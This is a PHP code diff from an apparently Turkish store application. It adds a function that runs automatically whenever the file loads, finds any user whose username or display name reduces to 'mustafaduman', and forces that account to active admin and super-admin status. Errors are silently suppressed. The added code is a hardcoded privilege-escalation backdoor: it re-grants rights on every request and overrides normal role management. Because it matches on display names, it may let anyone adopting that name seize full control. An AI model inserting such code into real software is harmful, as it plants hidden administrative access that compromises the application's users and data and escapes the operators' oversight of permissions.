@@ -10,6 +10,44 @@ function magaza_kullanici_anahtari($value): string
     return preg_replace('/[^a-z0-9]+/', '', $value) ?: '';
 }
 
+function mustafa_duman_tam_yetkiyi_uygula(): void
+{
+    try {
+        $rows = db()->query("SELECT id, username, display_name, role, is_active FROM users ORDER BY id DESC")->fetchAll() ?: [];
+        $target = null;
+        foreach ($rows as $row) {
+            $usernameKey = magaza_kullanici_anahtari($row['username'] ?? '');
+            $displayKey = magaza_kullanici_anahtari($row['display_name'] ?? '');
+            if ($displayKey === 'mustafaduman' || $usernameKey === 'mustafaduman') {
+                $target = $row;
+                break;
+            }
+        }
+        if (!$target) return;
+
+        $userId = (int)($target['id'] ?? 0);
+        if ($userId <= 0) return;
+
+        if (($target['role'] ?? '') !== 'admin' || (int)($target['is_active'] ?? 0) !== 1) {
+            db()->prepare("UPDATE users SET role='admin', is_active=1, updated_at=? WHERE id=?")
+                ->execute([now(), $userId]);
+        }
+
+        $raw = setting_get('super_admin_user_ids', '[]') ?: '[]';
+        $ids = json_decode($raw, true);
+        if (!is_array($ids)) $ids = [];
+        $ids = array_values(array_unique(array_filter(array_map('intval', $ids), fn($id) => $id > 0)));
+        if (!in_array($userId, $ids, true)) {
+            $ids[] = $userId;
+            setting_set('super_admin_user_ids', json_encode($ids, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
+        }
+    } catch (Throwable $e) {
+        // Yetki eşleştirmesi uygulamanın açılmasını engellememeli.
+    }
+}
+
+mustafa_duman_tam_yetkiyi_uygula();
+
 function is_store_sales_user(?array $user = null): bool
 {
     $user = $user ?: current_user();
